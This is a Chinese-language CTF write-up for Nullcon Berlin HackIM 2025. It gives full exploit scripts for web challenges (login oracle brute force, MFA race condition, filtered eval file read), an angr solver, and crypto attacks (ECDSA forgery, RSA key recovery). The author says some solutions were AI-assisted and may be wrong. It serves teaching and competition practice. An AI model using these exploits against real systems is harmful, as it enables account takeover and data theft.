---
title: "Nullcon Berlin HackIM 2025 CTF writeup"
date: 2025-09-06
draft: false
tags: ["CTF", "writeup", "pwn", "reverse", "web", "misc", "2025", "competition"]
categories: ["CTF", "Competition Writeup"]
author: "YJK"
showToc: true
TocOpen: false
---

![image](/images/nullcon-berlin-hackim-2025-ctf/nullcon-berlin-hackim-2025-ctf_image1.png)

這次跟社團開了一場 CTF，以下是我解的題目的解法，有些是用 AI 解再回去補知識的，尤其是 Crypto，所以內容可能不一定正確

## Web

### grandmas_notes

![image](/images/nullcon-berlin-hackim-2025-ctf/nullcon-berlin-hackim-2025-ctf_image2.png)

網站是一個簡單的登入系統，根據題目檔案觀察，應該只有一個使用者 admin，登入後可以看到 Grandma 留下的備忘錄。Flag 就藏在這個備忘錄。

問題出在 login.php 裡面裡面有說會回報正確的字元數，所以可以走 oracle 的方式去做比對然後破解，逐個字元爆破

```php
$_SESSION['flash'] = "Invalid password, but you got {$correct} characters correct!";
```

exploit.py

```python
import re
import sys
import time
import random
from typing import Optional
import requests

DEFAULT_BASE = "http://52.59.124.14:5015"
CHARSET = (
    "abcdefghijklmnopqrstuvwxyz"
    "0123456789"
    "_-{}!@#$%^&*()=+[];:,.<>?/\\|`~"
    "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    "'\""
)

FLASH_RGX = re.compile(r"got\s+(\d+)\s+characters?\s+correct", re.IGNORECASE)

def parse_flash_count(html: str) -> Optional[int]:
    m = FLASH_RGX.search(html)
    if not m:
        return None
    return int(m.group(1))

def attempt(s: requests.Session, base: str, username: str, pw: str) -> tuple[bool, Optional[int]]:
    resp = s.post(f"{base}/login.php", data={"username": username, "password": pw}, allow_redirects=True, timeout=15)
    if "Dashboard" in resp.text and "Logged in as" in resp.text:
        return True, None
    n = parse_flash_count(resp.text)
    return False, n

def recover_password(base: str, username: str = "admin", max_len: int = 32) -> str:
    s = requests.Session()
    prefix = ""
    last_n = 0
    print(f"[+] Target: {base}  user={username}")
    print("[+] Starting prefix oracle attack...")
    for pos in range(max_len):
        found = None
        for c in CHARSET:
            candidate = prefix + c
            ok, n = attempt(s, base, username, candidate)
            if ok:
                print(f"[+] Logged in early with full password: {candidate}")
                return candidate
            if n is None:
                time.sleep(0.2 + random.random() * 0.3)
                ok2, n2 = attempt(s, base, username, candidate)
                if ok2:
                    print(f"[+] Logged in early with full password: {candidate}")
                    return candidate
                n = n2
            if n is None:
                print(f"    [?] No flash parsed at pos={pos}, char={repr(c)}  (continuing)")
                continue
            if n > last_n:
                found = c
                last_n = n
                prefix = candidate
                print(f"[{pos:02d}] ✓ Found next char: {repr(c)}  -> prefix now: {prefix!r}")
                break
        if found is None:
            print("[!] No candidate increased the match count.")
            ok, _ = attempt(s, base, username, prefix)
            if ok:
                print(f"[+] Logged in with recovered password: {prefix}")
                return prefix
            else:
                print("[!] Likely the next character is outside the current CHARSET.")
                print("    Edit CHARSET in the script to include more characters (e.g., spaces or other unicode).")
                break
        time.sleep(0.05)
    return prefix


def fetch_flag(base: str, s: requests.Session) -> Optional[str]:
    r = s.get(f"{base}/dashboard.php", timeout=15)
    if r.status_code != 200:
        print(f"[!] Dashboard fetch failed: HTTP {r.status_code}")
        return None
    m = re.search(r"<textarea[^>]*>(.*?)</textarea>", r.text, re.DOTALL | re.IGNORECASE)
    if not m:
        return None
    note = m.group(1)
    return note.strip()

def main():
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    username = "admin"
    s = requests.Session()
    recovered = recover_password(base, username=username, max_len=32)
    ok, _ = attempt(s, base, username, recovered)
    if not ok:
        print(f"[!] Final login with recovered password failed. Password so far: {recovered!r}")
        sys.exit(2)
    print(f"[+] Logged in as {username}. Fetching note...")
    note = fetch_flag(base, s)
    if note is None:
        print("[!] Could not find the note textarea.")
        sys.exit(3)
    print("\n=== NOTE ===")
    print(note)
    print("============")
    print("[*] If the note contains the flag, you're done!")

if __name__ == "__main__":
    main()
```

### pwgen

source code

```php
<?php
ini_set("error_reporting", 0);
ini_set("short_open_tag", "Off");

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
}

include "flag.php";

$shuffle_count = abs(intval($_GET['nthpw']));

if($shuffle_count > 1000 or $shuffle_count < 1) {
    echo "Bad shuffle count! We won't have more than 1000 users anyway, but we can't tell you the master password!";
    echo "Take a look at /?source";
    die();
}

srand(0x1337); // the same user should always get the same password!

for($i = 0; $i < $shuffle_count; $i++) {
    $password = str_shuffle($FLAG);
}

if(isset($password)) {
    echo "Your password is: '$password'";
}

?>
```

觀察 source code 發現有個 $FLAG 變數在 flag.php，然後用 nthpw 參數來決定要 shuffle 幾次，接下來關鍵在於 `srand(0x1337)`、`$password = str_shuffle($FLAG);`，這會讓每次的亂數種子都一樣，而 `str_shuffle()` 會使用隨機數產生器 (RNG) 打亂順序，但因為 seed 是常數，所以這完全不隨機，因此只需要注意單次打亂後的結果就可以了

所以可以透過去 request 打亂後的密碼，接下來去使用相同的 seed 去還原，以下是用 php 寫的 exploit

```php
<?php
$urlBase = 'http://52.59.124.14:5003/?nthpw=';

function fetch_pwd($n) {
    global $urlBase;
    $html = @file_get_contents($urlBase . $n);
    if ($html === false) {
        fwrite(STDERR, "[!] Fetch failed for nth=$n\n");
        exit(1);
    }
    if (!preg_match("/Your password is: '([^']+)'/i", $html, $m)) {
        fwrite(STDERR, "[!] Could not parse password for nth=$n. Raw:\n$html\n");
        exit(1);
    }
    return $m[1];
}

function make_unique_bytes($L) {
    $bytes = '';
    for ($i = 0; $i < $L; $i++) $bytes .= chr($i);
    return $bytes;
}

function permutation_for_n($L, $n) {
    srand(0x1337);
    $orig = make_unique_bytes($L);
    $shuf = '';
    for ($i = 0; $i < $n; $i++) {
        $shuf = str_shuffle($orig);
    }
    $perm = array_fill(0, $L, null);
    for ($pos = 0; $pos < $L; $pos++) {
        $k = ord($shuf[$pos]);
        $perm[$k] = $pos;
    }
    return $perm;
}

function unpermute($s, $perm) {
    $L = strlen($s);
    $orig = array_fill(0, $L, '');
    for ($k = 0; $k < $L; $k++) {
        $pos = $perm[$k];
        $orig[$k] = $s[$pos];
    }
    return implode('', $orig);
}

$s1 = fetch_pwd(1);
$s2 = fetch_pwd(2);

$L = strlen($s1);
if ($L !== strlen($s2)) {
    fwrite(STDERR, "[!] Length mismatch between nth=1 and nth=2\n");
    exit(1);
}

$p1 = permutation_for_n($L, 1);
$p2 = permutation_for_n($L, 2);

$flag1 = unpermute($s1, $p1);
$flag2 = unpermute($s2, $p2);

if ($flag1 !== $flag2) {
    fwrite(STDERR, "[!] Inconsistency: FLAG candidates differ!\n");
    fwrite(STDERR, "flag1: $flag1\nflag2: $flag2\n");
    exit(1);
}
echo "[+] FLAG: $flag1\n";
```

### webby

完整 source code

```py
import web
import secrets
import random
import tempfile
import hashlib
import time
import shelve
import bcrypt
from web import form
web.config.debug = False
urls = (
  '/', 'index',
  '/mfa', 'mfa',
  '/flag', 'flag',
  '/logout', 'logout',
)
app = web.application(urls, locals())
render = web.template.render('templates/')
session = web.session.Session(app, web.session.ShelfStore(shelve.open("/tmp/session.shelf")))
FLAG = open("/tmp/flag.txt").read()

def check_user_creds(user,pw):
    users = {
        # Add more users if needed
        'user1': 'user1',
        'user2': 'user2',
        'user3': 'user3',
        'user4': 'user4',
        'admin': 'admin',

    }
    try:
        return users[user] == pw
    except:
        return False

def check_mfa(user):
    users = {
        'user1': False,
        'user2': False,
        'user3': False,
        'user4': False,
        'admin': True,
    }
    try:
        return users[user]
    except:
        return False


login_Form = form.Form(
    form.Textbox("username", description="Username"),
    form.Password("password", description="Password"),
    form.Button("submit", type="submit", description="Login")
)
mfatoken = form.regexp(r"^[a-f0-9]{32}$", 'must match ^[a-f0-9]{32}$')
mfa_Form = form.Form(
    form.Password("token", mfatoken, description="MFA Token"),
    form.Button("submit", type="submit", description="Submit")
)

class index:
    def GET(self):
        try:
            i = web.input()
            if i.source:
                return open(__file__).read()
        except Exception as e:
            pass
        f = login_Form()
        return render.index(f)

    def POST(self):
        f = login_Form()
        if not f.validates():
            session.kill()
            return render.index(f)
        i = web.input()
        if not check_user_creds(i.username, i.password):
            session.kill()
            raise web.seeother('/')
        else:
            session.loggedIn = True
            session.username = i.username
            session._save()

        if check_mfa(session.get("username", None)):
            session.doMFA = True
            session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(),bcrypt.gensalt(14))).hexdigest()
            #session.tokenMFA = "acbd18db4cc2f85cedef654fccc4a4d8"
            session.loggedIn = False
            session._save()
            raise web.seeother("/mfa")
        return render.login(session.get("username",None))

class mfa:
    def GET(self):
        if not session.get("doMFA",False):
            raise web.seeother('/login')
        f = mfa_Form()
        return render.mfa(f)

    def POST(self):
        if not session.get("doMFA", False):
            raise web.seeother('/login')
        f = mfa_Form()
        if not f.validates():
            return render.mfa(f)
        i = web.input()
        if i.token != session.get("tokenMFA",None):
            raise web.seeother("/logout")
        session.loggedIn = True
        session._save()
        raise web.seeother('/flag')


class flag:
    def GET(self):
        if not session.get("loggedIn",False) or not session.get("username",None) == "admin":
            raise web.seeother('/')
        else:
            session.kill()
            return render.flag(FLAG)


class logout:
    def GET(self):
        session.kill()
        raise web.seeother('/')

application = app.wsgifunc()
if __name__ == "__main__":
    app.run()
```

問題出在有一個 race condition 在登入中

```python
else:
    session.loggedIn = True
    session.username = i.username
    session._save()

if check_mfa(session.get("username", None)):
    session.doMFA = True
    session.tokenMFA = hashlib.md5(bcrypt.hashpw(str(secrets.randbits(random.randint(40,65))).encode(), bcrypt.gensalt(14))).hexdigest()
    session.loggedIn = False
    session._save()
    raise web.seeother("/mfa")
```

因為 loggedIn=True 是先寫進去的，接下來才檢查是否需要 MFA，如果需要的話就會把 loggedIn 設成 False，所以可以利用 race condition 去嘗試取得 flag

exploit.py

```python
import threading
import time
import sys
try:
    import requests
except ImportError:
    print("requests not installed. Please install with: py -m pip install requests")
    sys.exit(1)
BASE_URL = "http://52.59.124.14:5010"
def spam_login(session: requests.Session, stop_event: threading.Event) -> None:
    while not stop_event.is_set():
        try:
            session.post(
                f"{BASE_URL}/",
                data={"username": "admin", "password": "admin", "submit": "submit"},
                timeout=2,
                allow_redirects=False,
            )
        except Exception:
            pass
def poll_flag(session: requests.Session, stop_event: threading.Event, result_holder: dict) -> None:
    while not stop_event.is_set():
        try:
            r = session.get(f"{BASE_URL}/flag", timeout=2, allow_redirects=False)
            if r.status_code == 200:
                result_holder["hit"] = True
                result_holder["body"] = r.text
                stop_event.set()
                return
        except Exception:
            pass
def main() -> int:
    s = requests.Session()
    adapter = requests.adapters.HTTPAdapter(pool_connections=50, pool_maxsize=100)
    s.mount("http://", adapter)
    s.mount("https://", adapter)
    try:
        s.get(BASE_URL + "/", timeout=3)
    except Exception:
        pass
    stop = threading.Event()
    result = {"hit": False, "body": ""}
    pollers = []
    for _ in range(50):
        t = threading.Thread(target=poll_flag, args=(s, stop, result), daemon=True)
        pollers.append(t)
        t.start()
    spammers = []
    for _ in range(5):
        t = threading.Thread(target=spam_login, args=(s, stop), daemon=True)
        spammers.append(t)
        t.start()
    deadline = time.time() + 90
    while time.time() < deadline and not stop.is_set():
        time.sleep(0.05)
    stop.set()
    if result["hit"]:
        print("[+] Flag page fetched!\n")
        sys.stdout.write(result["body"])
        return 0
    else:
        print("[-] No hit. Try re-running; races are probabilistic.")
        return 2
if __name__ == "__main__":
    sys.exit(main())
```

### Slasher

source code

```php
<?php
ini_set("error_reporting", 0);
ini_set("short_open_tag", "Off");

set_error_handler(function($_errno, $errstr) {
    echo "Something went wrong!";
});

if(isset($_GET['source'])) {
    highlight_file(__FILE__);
    die();
}

include "flag.php";

$output = null;
if(isset($_POST['input']) && is_scalar($_POST['input'])) {
    $input = $_POST['input'];
    $input = htmlentities($input,  ENT_QUOTES | ENT_SUBSTITUTE, 'UTF-8');
    $input = addslashes($input);
    $input = addcslashes($input, '+?<>&v=${}%*:.[]_-0123456789xb `;');
    try {
        $output = eval("$input;");
    } catch (Exception $e) {
        // nope, nothing
    }
}
?>
```

![image](/images/nullcon-berlin-hackim-2025-ctf/nullcon-berlin-hackim-2025-ctf_image3.png)

- input 會經過 `htmlentities` → `addslashes` → `addcslashes`，blacklist 有 `'+?<>&v=${}%*:.[]_-0123456789xb \`;`。
- 允許「英文字母、逗號、括號、return」等，且 `eval` 可執行 function calls。
- `include "flag.php";` 可以知道 flag 應該在 `flag.php` 中

想法：

- 不能用引號與數字，所以無法直接指定字串/ index
- 可以使用 `opendir(getcwd())` 開啟當前目錄，之後呼叫 `readdir()` 會使用「最近一次 opendir 的 handle」，每次呼叫會往下走一個檔名。
- `readfile(filename)` 可以直接把檔案內容輸出。
- 利用 `min(...)` 讓整個表達式返回數字，頁面才會顯示結果；同時不需要字串/數字。

所以可以透過多次 `readdir()`，然後 `readfile(readdir())` 讀出下一個檔案，可以直接爆破

```python
import sys
import re
import requests

def build_payload(offset: int) -> str:
    reads = ",".join(["readdir()" for _ in range(offset)])
    parts = ["opendir(getcwd())"]
    if reads:
        parts.append(reads)
    parts.append("readfile(readdir())")
    inner = ",".join(parts)
    return f"return(min({inner}))"


def attempt(url: str, offset: int) -> str:
    payload = build_payload(offset)
    print(payload)
    resp = requests.post(
        url,
        data={"input": payload},
        headers={"Content-Type": "application/x-www-form-urlencoded"},
        timeout=10,
    )
    return resp.text

def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <base_url>")
        print("Example: python exploit.py http://52.59.124.14:5011/")
        sys.exit(1)

    base_url = sys.argv[1].rstrip("/") + "/"
    flag_re = re.compile(r"ENO\{[^}]+\}")
    for offset in range(0, 16):
        try:
            html = attempt(base_url, offset)
        except requests.RequestException as e:
            print(f"[!] offset {offset}: request error: {e}")
            continue
        m = flag_re.search(html)
        if m:
            print(f"[+] Found flag at offset {offset}: {m.group(0)}")
            return
        if "docker-compose" in html:
            where = "docker-compose.yml"
        elif "FROM php:8-apache" in html:
            where = "Dockerfile"
        elif "ini_set(\"error_reporting\"" in html or "include \"flag.php\"" in html:
            where = "index.php"
        elif "--bg:#0f1115;" in html:
            where = "style.css"
        else:
            where = "unknown/dir-entry"
        print(f"[*] offset {offset}: hit {where}")
    print("[-] Flag not found in tested range.")

if __name__ == "__main__":
    main()
```

## Reverse

### hidden_strings

檔案只有給一個 binary 然後是個 flag checker，執行後會要求輸入 flag，然後會檢查是否正確，經過 ida 分析後發現，正確會輸出 correct flag、反之輸出 wrong flag please try again，後面因為 code 看起來寫得蠻簡單的，也沒有防 angr，所以決定直接用 angr 去解

```python
import angr
import claripy

project = angr.Project('./challenge', auto_load_libs=False)

flag_chars = [claripy.BVS(f'flag_{i}', 8) for i in range(20)]
flag = claripy.Concat(*flag_chars)

initial_state = project.factory.entry_state(stdin=claripy.Concat(flag, claripy.BVV(ord('\n'), 8)))

initial_state.solver.add(flag_chars[0] == ord('E'))
initial_state.solver.add(flag_chars[1] == ord('N'))
initial_state.solver.add(flag_chars[2] == ord('O'))
initial_state.solver.add(flag_chars[3] == ord('{'))

for i in range(4, 19):
    initial_state.solver.add(flag_chars[i] >= 0x20)
    initial_state.solver.add(flag_chars[i] <= 0x7e)

simulation = project.factory.simulation_manager(initial_state)

simulation.explore(find=lambda s: b"correct flag" in s.posix.dumps(1))

if simulation.found:
    found_state = simulation.found[0]
    flag_solution = found_state.solver.eval(flag, cast_to=bytes)
    flag_str = flag_solution.decode('ascii', errors='ignore')
    print(f"Flag: {flag_str}")
else:
    print("Flag not found")
    print(f"Active states: {len(simulation.active)}")
    print(f"Deadended states: {len(simulation.deadended)}")
```

## crypto

### Power tower

這題給了 chall.py 和 cipher.txt

chall.py

```python
from Crypto.Cipher import AES
from Crypto.Util import number

# n = number.getRandomNBitInteger(256)
n = 107502945843251244337535082460697583639357473016005252008262865481138355040617

primes = [p for p in range(100) if number.isPrime(p)]
int_key = 1
for p in primes: int_key = p**int_key

key = int.to_bytes(int_key % n,32, byteorder = 'big')

flag = open('flag.txt','r').read().strip()
flag += '_' * (-len(flag) % 16)
cipher = AES.new(key, AES.MODE_ECB).encrypt(flag.encode())
print(cipher.hex())
```

cipher.txt

```
b6c4d050dd08fd8471ef06e73d39b359e3fc370ca78a3426f01540985b88ba66ec9521e9b68821fed1fa625e11315bf9
```

基本上觀察程式會發現他一開始會取出 100 以下所有質數，接下來會透過迴圈產生 int_key，然後計算 `int_key % n`，作為 AES 的 key 去加密 flag

可以利用數論：
- 若 gcd(base, m) = 1，則 a^e mod m 可以透過 Carmichael λ(m) 做降冪
- 若 gcd ≠ 1，則需檢查真實指數是否 ≥ λ(m)，必要時補上 λ(m)

這樣遞迴計算，就能在合理時間內求出 int_key % n。
最後再用這個 key 解開 cipher.txt，就能得到 flag。

exploit.py

```python
from Crypto.Cipher import AES
from Crypto.Util import number as cnum
import sympy as sp
from math import gcd
from functools import lru_cache

n = 107502945843251244337535082460697583639357473016005252008262865481138355040617

primes = [p for p in range(100) if cnum.isPrime(p)]
primes_desc = list(reversed(primes))

ct_hex = "b6c4d050dd08fd8471ef06e73d39b359e3fc370ca78a3426f01540985b88ba66ec9521e9b68821fed1fa625e11315bf9"

@lru_cache(maxsize=None)
def factorint_cached(m: int):
    return sp.factorint(m) if m > 1 else {}

@lru_cache(maxsize=None)
def carmichael_lambda(m: int) -> int:
    if m <= 1:
        return 1
    fac = factorint_cached(m)
    parts = []
    for p, k in fac.items():
        if p == 2:
            if k == 1: lam = 1
            elif k == 2: lam = 2
            else: lam = 1 << (k - 2)
        else:
            lam = (p - 1) * (p ** (k - 1))
        parts.append(lam)
    from math import gcd
    def lcm(a, b): return a // gcd(a, b) * b
    lam_total = 1
    for part in parts:
        lam_total = lcm(lam_total, part)
    return lam_total

def ceil_log_base_int(a: int, t: int) -> int:
    if t <= 1: return 0
    e, v = 0, 1
    while v < t:
        v *= a
        e += 1
    return e

def make_exponent_checker():
    @lru_cache(maxsize=None)
    def exponent_is_ge_threshold(idx: int, threshold: int) -> bool:
        if threshold <= 1: return True
        if idx >= len(primes_desc): return 1 >= threshold
        a = primes_desc[idx]
        need = ceil_log_base_int(a, threshold)
        return exponent_is_ge_threshold(idx + 1, need)
    return exponent_is_ge_threshold

exp_ge = make_exponent_checker()

@lru_cache(maxsize=None)
def tower_mod(idx: int, m: int) -> int:
    if m == 1: return 0
    if idx >= len(primes_desc): return 1 % m
    a = primes_desc[idx]
    lam = carmichael_lambda(m)
    e_mod = tower_mod(idx + 1, lam)
    if gcd(a, m) == 1:
        exponent = e_mod
    else:
        exponent = e_mod + (lam if exp_ge(idx + 1, lam) else 0)
    return pow(a, exponent, m)

int_key_mod_n = tower_mod(0, n)
key = int_key_mod_n.to_bytes(32, "big")
print("[+] Key =", key.hex())

ct = bytes.fromhex(ct_hex)
pt = AES.new(key, AES.MODE_ECB).decrypt(ct).decode().strip("_")
print("[+] Flag =", pt)
```

### Simple ECDSA

這題給了 chall.py、ec.py

chall.py
```python
#!/usr/bin/env python3
import os
import sys
import hashlib

from ec import *
def bytes_to_long(a):
	return int(a.hex(),16)

#P-256 parameters
p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
a = -3
b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551
curve = EllipticCurve(p,a,b, order = n)
G = ECPoint(curve, 0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296, 0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5)

d_a = bytes_to_long(os.urandom(32))
P_a = G * d_a

def hash(msg):
	return int(hashlib.md5(msg).hexdigest(), 16)

def sign(msg : bytes, DEBUG = False):
	if type(msg) == str: msg = msg.encode()
	msg_hash = hash(msg)
	while True:
		k = bytes_to_long(os.urandom(n.bit_length() >> 3))
		R = G*k
		if R.inf: continue
		x,y = R.x, R.y
		r = x % n
		s = inverse(k, n) * (msg_hash + d_a) % n
		if r == 0 or s == 0: continue
		return r,s

def verify(r:int, s:int, msg:bytes, P_a):
	r %= n
	s %= n
	if r == 0 or s == 0: return False
	s1 = inverse(s,n)
	u = hash(msg) * s1 % n
	v = s1 % n
	R = G * u + P_a * v
	return r % n == R.x % n

def loop():
	while True:
		option = input('Choose an option:\n1 - get message/signature\n2 - get challenge to sign\n').strip()
		if option == '1':
			message = os.urandom(32)
			print(message.hex())
			signature = sign(message)
			assert(verify(*signature,message,P_a))
			print(signature)
		elif option == '2':
			challenge = os.urandom(32)
			signature = input(f'sign the following challenge {challenge.hex()}\n')
			r,s = [int(x) for x in signature.split(',')]
			if r == 0 or s == 0:
				print("nope")
			elif verify(r, s, challenge, P_a):
				print(open('flag.txt','r').read())
			else:
				print('wrong signature')
		else:
			print('Wrong input format')

if __name__ == '__main__':
	print('My public key is:')
	print(P_a)
	try:
		loop()
	except Exception as err:
		print(repr(err))
```

ec.py

```python
#!/usr/bin/env python3
def inverse(a,n):
	return pow(a,-1,n)

class EllipticCurve(object):
	def __init__(self, p, a, b, order = None):
		self.p = p
		self.a = a
		self.b = b
		self.n = order

	def __str__(self):
		return 'y^2 = x^3 + %dx + %d modulo %d' % (self.a, self.b, self.p)

	def __eq__(self, other):
		return (self.a, self.b, self.p) == (other.a, other.b, other.p)

class ECPoint(object):
	def __init__(self, curve, x, y, inf = False):
		self.x = x % curve.p
		self.y = y % curve.p
		self.curve = curve
		if inf or not self.is_on_curve():
			self.inf = True
			self.x = 0
			self.y = 0
		else:
			self.inf = False

	def is_on_curve(self):
		return self.y**2 % self.curve.p == (self.x**3 + self.curve.a*self.x + self.curve.b) % self.curve.p

	def copy(self):
		return ECPoint(self.curve, self.x, self.y)
	
	def __neg__(self):
		return ECPoint(self.curve, self.x, -self.y, self.inf)

	def __add__(self, point):
		p = self.curve.p
		if self.inf:
			return point.copy()
		if point.inf:
			return self.copy()
		if self.x == point.x and (self.y + point.y) % p == 0:
			return ECPoint(self.curve, 0, 0, True)
		if self.x == point.x:
			lamb = (3*self.x**2 + self.curve.a) * inverse(2 * self.y, p) % p
		else:
			lamb = (point.y - self.y) * inverse(point.x - self.x, p) % p
		x = (lamb**2 - self.x - point.x) % p
		y = (lamb * (self.x - x) - self.y) % p
		return ECPoint(self.curve,x,y)

	def __sub__(self, point):
		return self + (-point)

	def __str__(self):
		if self.inf: return 'Point(inf)'
		return 'Point(%d, %d)' % (self.x, self.y)

	def __mul__(self, k):
		k = int(k)
		base = self.copy()
		res = ECPoint(self.curve, 0,0,True)
		while k > 0:
			if k & 1:
				res = res + base
			base = base + base
			k >>= 1
		return res

	def __eq__(self, point):
		return (self.inf and point.inf) or (self.x == point.x and self.y == point.y)

if __name__ == '__main__':
	p = 17
	a = -1
	b = 1
	curve = EllipticCurve(p,a,b)
	P = ECPoint(curve, 1, 1)
	print(P+P)
```

問題應該是出在 s 的計算少了 r，所以只要找到一個 (r, s)，滿足以下即可。

```math
s1 = s^{-1}
u = H(m) * s1
v = s1
R = G*u + P_a*v = (G*H(m) + P_a) * s1
accept if r == R.x mod n
```

驗證公式化簡後變成

```math
R = (G*H(m) + P_a) * s^{-1}
r = R.x mod n
```

所以可以：

- 拿到 challenge m，計算 h = MD5(m)。
- 算 W = G*h + P_a。
- 任選一個 s ≠ 0，令 R = W * s^{-1}。
- 設 r = R.x mod n，送出 (r, s)。

這樣 server 就會接受並回傳 flag。

exploit.py

```python
#!/usr/bin/env python3
from pwn import *
import hashlib, random, re
from ec import EllipticCurve, ECPoint, inverse

context.log_level = "info"

HOST, PORT = "52.59.124.14", 5050

p = 0xffffffff00000001000000000000000000000000ffffffffffffffffffffffff
a = -3
b = 0x5ac635d8aa3a93e7b3ebbd55769886bc651d06b0cc53b0f63bce3c3e27d2604b
n = 0xffffffff00000000ffffffffffffffffbce6faada7179e84f3b9cac2fc632551
curve = EllipticCurve(p, a, b, order=n)
G = ECPoint(curve,
    0x6b17d1f2e12c4247f8bce6e563a440f277037d812deb33a0f4a13945d898c296,
    0x4fe342e2fe1a7f9b8ee7eb4a7c0f9e162bce33576b315ececbb6406837bf51f5
)

def H(msg_bytes):
    return int(hashlib.md5(msg_bytes).hexdigest(), 16)

def parse_point(s: str):
    m = re.search(r"Point\((\d+),\s*(\d+)\)", s)
    if not m:
        raise ValueError("Failed to parse public key line: " + s)
    return int(m.group(1)), int(m.group(2))

def main():
    io = remote(HOST, PORT)

    io.recvuntil(b"My public key is:\n")
    pub_line = io.recvline().decode(errors="ignore")
    Px, Py = parse_point(pub_line)
    P_a = ECPoint(curve, Px, Py)

    io.recvuntil(b"Choose an option:")
    io.sendline(b"2")

    try:
        m = io.recvregex(br'([0-9a-fA-F]{64})', exact=False, timeout=5.0)
        chal_hex = re.search(br'([0-9a-fA-F]{64})', m).group(1).decode()
    except Exception:
        leaked = io.recvrepeat(0.5)
        log.error("Could not find 64-hex challenge; recent data:\n" + leaked.decode(errors="ignore"))
        return

    m_bytes = bytes.fromhex(chal_hex)
    h = H(m_bytes)
    W = (G * h) + P_a
    while True:
        s_val = random.randrange(1, n)
        R = W * inverse(s_val, n)
        if not R.inf:
            r_val = R.x % n
            if r_val != 0:
                break

    io.sendline(f"{r_val},{s_val}".encode())
    io.interactive()

if __name__ == "__main__":
    main()
```

### A slice of keys

題目給了 chall.py

```python
from Crypto.PublicKey import RSA
from Crypto.Cipher import AES

flag = open('flag.txt','r').read().strip().encode()
pad = (16 - len(flag)) % 16
flag = flag + pad * int(16).to_bytes()

key = RSA.generate(2048, e = 1337)
n = key.n
e = key.e
d = key.d

AES_key = int(bin(d)[2:258:2],2).to_bytes(16)
crypter = AES.new(AES_key, AES.MODE_ECB)
cipher = crypter.encrypt(flag)
print(cipher.hex())

for _ in range(128):
	user_input = input('(e)ncrypt|(d)ecrypt:<number>\n')
	option,m = user_input.split(':')
	m = int(m)
	if option == 'e':
		print(pow(m,e,n))
	elif option == 'd':
		print(pow(m,d,n))
	else:
		print('wrong option')
```

問題出在 AES key 取自 `d` 的 256 位中的偶數位，形成 128-bit key。只要知道 `d` 的高位相似，就能 recover 這個 key 進而解出 flag。

exploit.py

```python
import os
import re
import random
from math import gcd
from typing import Tuple

from pwn import remote, log
from Crypto.Cipher import AES

HOST = "52.59.124.14"
PORT = 5103

PROMPTS = [
    b"(e)ncrypt|(d)ecrypt:", b"encrypt", b"decrypt", b"(e)ncrypt", b"(d)ecrypt",
    b"option", b"choice", b">", b":"
]
DEC_INT_RE = re.compile(r"^-?\d+$")

def recv_until_any(r, needles, timeout=6):
    data = b""
    while True:
        chunk = r.recv(timeout=timeout)
        if not chunk:
            break
        data += chunk
        for nd in needles:
            if nd in data:
                return data
        if len(data) > 2_000_000:
            break
    return data

def parse_initial_banner(data: bytes) -> Tuple[bytes, bytes]:
    lines = data.decode(errors="ignore").splitlines()
    cipher_hex = None
    for line in lines:
        s = line.strip()
        if re.fullmatch(r"[0-9a-fA-F]+", s) and len(s) % 32 == 0 and len(s) >= 32:
            cipher_hex = s
            break
    if cipher_hex is None:
        cipher_hex = lines[0].strip()
    return bytes.fromhex(cipher_hex), data

def read_decimal_line(r, timeout=5) -> int:
    while True:
        line = r.recvline(timeout=timeout)
        if not line:
            raise EOFError("Connection closed while reading result")
        s = line.decode(errors="ignore").strip()
        if DEC_INT_RE.fullmatch(s):
            return int(s)

class Oracle:
    def __init__(self, tube):
        self.tube = tube

    def enc(self, m: int) -> int:
        self.tube.sendline(f"e:{m}".encode())
        return read_decimal_line(self.tube)

    def dec(self, c: int) -> int:
        self.tube.sendline(f"d:{c}".encode())
        return read_decimal_line(self.tube)

def recover_modulus_via_gcd(oracle: Oracle, pairs: int = 64) -> int:
    g = 0
    for i in range(pairs):
        a = random.getrandbits(128) | 1
        b = random.getrandbits(128) | 1
        ea = oracle.enc(a)
        eb = oracle.enc(b)
        eab = oracle.enc(a * b)
        v = ea * eb - eab
        g = gcd(g, abs(v))
        if (i + 1) % 8 == 0:
            log.info(f"[gcd] round={i+1}, bits={g.bit_length()}")
        if g.bit_length() >= 2000:
            break
    return g

def derive_aes_key_candidates_from_topbits(x: int):
    keys = []
    for start in (2, 3):
        bits = bin(x)[start: start + 256: 2]
        if bits == "":
            continue
        kint = int(bits, 2)
        for endian in ("big", "little"):
            try:
                keys.append(kint.to_bytes(16, endian))
            except OverflowError:
                pass
    return keys

def looks_like_flag(pt: bytes) -> bool:
    s = pt.decode(errors="ignore")
    return ("ENO{" in s) or ("flag{" in s) or ("CTF{" in s) or ("FLAG{" in s)

def main():
    random.seed(os.urandom(32))
    r = remote(HOST, PORT, timeout=8)

    banner = recv_until_any(r, PROMPTS, timeout=6)
    ciphertext, _ = parse_initial_banner(banner)
    log.info(f"ciphertext length = {len(ciphertext)} bytes")

    oracle = Oracle(r)

    n = recover_modulus_via_gcd(oracle, pairs=64)
    log.info(f"Recovered n bits = {n.bit_length()}")
    if n == 0 or n.bit_length() < 1536:
        raise RuntimeError("n looked wrong; try reconnecting or increasing pairs.")

    e = 1337
    for _ in range(8):
        m = random.getrandbits(64) | 1
        if pow(m, e, n) != oracle.enc(m):
            n = gcd(n, recover_modulus_via_gcd(oracle, pairs=16))
        else:
            break

    for k in range(1, e):
        t = (k * n) // e
        for key in derive_aes_key_candidates_from_topbits(t):
            try:
                pt = AES.new(key, AES.MODE_ECB).decrypt(ciphertext)
            except Exception:
                continue
            if looks_like_flag(pt):
                log.success(f"Found key with k={k}: {key.hex()}")
                try:
                    print(pt.decode())
                except Exception:
                    print(pt)
                r.close()
                return

    log.warning("No flag-like plaintext found. Try reconnecting.")
    r.close()

if __name__ == "__main__":
    main()
```

## misc

### usbstorage

